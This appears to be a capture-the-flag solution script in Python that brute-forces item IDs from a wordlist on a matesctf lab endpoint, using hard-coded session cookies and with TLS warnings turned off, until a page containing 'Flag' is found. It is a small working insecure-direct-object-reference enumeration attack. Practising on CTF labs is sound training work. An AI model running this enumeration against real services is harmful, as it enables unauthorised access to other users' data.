import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
authen_url = "https://labs.matesctf.org/lab/auth/2/index.php?page=login"
item_url = 'https://labs.matesctf.org/lab/auth/2/index.php?page=item&id='
num = open("./wordlist/600-1000.txt", "r").read().splitlines()
header = {
  "cookie": "__cfduid=d8d51f1869479e5242217e2cf9138d1d41602516193; PHPSESSID=9765d58edb1eff8def93a16aa5e2304c; session=ad78d9f7-4249-4291-8485-bf4c40f47121.SpwhybcXBYzlLkinymyWZ1iCMzo",
}
for a in num:
  x = requests.get(item_url+str(a), headers = header)
  print(a)
  if("Flag" in x.text):
    print(a)
    break
